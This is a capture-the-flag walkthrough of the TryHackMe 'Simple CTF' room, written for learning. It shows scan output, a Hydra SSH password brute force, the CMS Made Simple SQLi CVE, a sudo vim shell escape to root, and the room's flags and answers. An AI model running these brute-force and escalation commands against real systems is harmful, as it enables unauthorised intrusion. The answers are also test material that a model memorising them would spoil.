# Simple CTF

Beginner level ctf

[Simple CTF](https://tryhackme.com/room/easyctf)

## Topic's

* Web Enumeration
* Network Enumeration
* CVE-2019-9053 - CMS Made Simple < 2.2.10
* Brute Forcing (SSH)
* Misconfigured Binaries

## Simple CTF

Deploy the machine and attempt the questions!

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ nikto -h http://10.10.158.205/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.158.205
+ Target Hostname:    10.10.158.205
+ Target Port:        80
+ Start Time:         2020-10-04 20:47:22 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590523e6dfcd7, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
```

1. How many services are running under port 1000?

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ sudo nmap -A -sC -sV -sS -O 10.10.158.205
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 20:43 CEST
Nmap scan report for 10.10.158.205
Host is up (0.094s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   closed http
2222/tcp open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Device type: storage-misc|general purpose|WAP
Running (JUST GUESSING): HP embedded (87%), Linux 2.6.X|3.X (86%), Ubiquiti embedded (86%), Ubiquiti AirOS 5.X (86%)
OS CPE: cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/h:ubnt:airmax_nanostation cpe:/o:ubnt:airos:5.2.6
Aggressive OS guesses: HP P2000 G3 NAS device (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%), Linux 3.7 (86%), Linux 2.6.32 - 3.13 (86%), Linux 3.0 - 3.2 (86%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (86%), Ubiquiti AirOS 5.5.9 (85%), Linux 3.3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   39.03 ms  10.8.0.1
2   105.55 ms 10.10.158.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.04 seconds
```

`2`

3. What is running on the higher port?

`SSH`

4. What's the CVE you're using against the application?

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.158.205/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.158.205/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/04 20:46:58 Starting gobuster
===============================================================
/simple (Status: 301)
Progress: 79243 / 220561 (35.93%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/04 20:54:11 Finished
===============================================================
```

* [CMS Made Simple < 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635)

`CVE-2019-9053`

6. To what kind of vulnerability is the application vulnerable?

`SQLi`

7. What's the password?

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.158.205 -s 2222 -Vv ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 21:04:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.158.205:2222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://mitch@10.10.158.205:2222
[INFO] Successful, password authentication is supported by ssh://10.10.158.205:2222
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "654321" - 17 of 14344401 [child 2] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "michael" - 18 of 14344401 [child 13] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "ashley" - 19 of 14344401 [child 12] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "qwerty" - 20 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "111111" - 21 of 14344401 [child 1] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "iloveu" - 22 of 14344401 [child 3] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "000000" - 23 of 14344401 [child 6] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "michelle" - 24 of 14344401 [child 8] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "tigger" - 25 of 14344401 [child 11] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "sunshine" - 26 of 14344401 [child 14] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "chocolate" - 27 of 14344401 [child 2] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "password1" - 28 of 14344401 [child 4] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "soccer" - 29 of 14344401 [child 5] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "anthony" - 30 of 14344401 [child 7] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "friends" - 31 of 14344401 [child 9] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "butterfly" - 32 of 14344401 [child 10] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "purple" - 33 of 14344401 [child 13] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "angel" - 34 of 14344401 [child 15] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "jordan" - 35 of 14344401 [child 12] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "liverpool" - 36 of 14344401 [child 15] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "justin" - 37 of 14344401 [child 9] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "loveme" - 38 of 14344401 [child 14] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "fuckyou" - 39 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "123123" - 40 of 14344401 [child 4] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "football" - 41 of 14344401 [child 13] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "secret" - 42 of 14344401 [child 2] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "andrea" - 43 of 14344401 [child 3] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "carlos" - 44 of 14344401 [child 5] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "jennifer" - 45 of 14344401 [child 7] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "joshua" - 46 of 14344401 [child 8] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "bubbles" - 47 of 14344401 [child 1] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "1234567890" - 48 of 14344401 [child 6] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "superman" - 49 of 14344401 [child 10] (0/2)
[ATTEMPT] target 10.10.158.205 - login "mitch" - pass "hannah" - 50 of 14344401 [child 11] (0/2)
[2222][ssh] host: 10.10.158.205   login: mitch   password: secret
[STATUS] attack finished for 10.10.158.205 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-04 21:04:18
```

`[2222][ssh] host: 10.10.158.205   login: mitch   password: secret`

`secret`

9. Where can you login with the details obtained?

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ ssh mitch@10.10.158.205 -p 2222
The authenticity of host '[10.10.158.205]:2222 ([10.10.158.205]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.158.205]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.158.205's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
```

`SSH`

10. What's the user flag?

```
$ whoami
mitch
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$ 
```

12. Is there any other user in the home directory? What's its name?

```
$ ls /home
mitch  sunbath
$
```

`sunbath`

13. What can you leverage to spawn a privileged shell?

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`vim`

14. What's the root flag?

```
$ sudo vim -c ':!/bin/sh'

# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
# 
```

`W3ll d0n3. You made it!`
